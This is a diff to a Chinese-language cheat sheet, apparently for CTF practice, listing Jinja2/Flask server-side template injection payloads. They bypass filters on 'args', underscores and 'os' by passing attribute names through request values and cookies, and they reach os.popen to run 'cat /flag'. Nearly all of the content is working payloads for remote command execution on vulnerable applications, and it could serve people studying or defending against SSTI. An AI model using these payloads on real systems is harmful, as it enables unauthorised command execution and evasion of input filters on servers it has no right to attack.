@@ -173,7 +173,7 @@ array.pop(0)
 
 ^
 ## **请求参数args过滤绕过**
-1、不用args，通过value获取所有参数。
+1、不用args，通过values获取所有参数。
 ```
 ?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
 ```
@@ -202,3 +202,26 @@ Cookie:c=cat /flag
 用__getitem__(下标)
 ```
 
+
+^
+## **过滤_下划线绕过**
+
+传参绕过
+```
+?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
+```
+cookie绕过
+```
+?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
+
+cookie:a=__globals__;b=cat /flag
+```
+
+
+
+^
+## **过滤OS**
+还是传参绕过
+```
+?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
+```
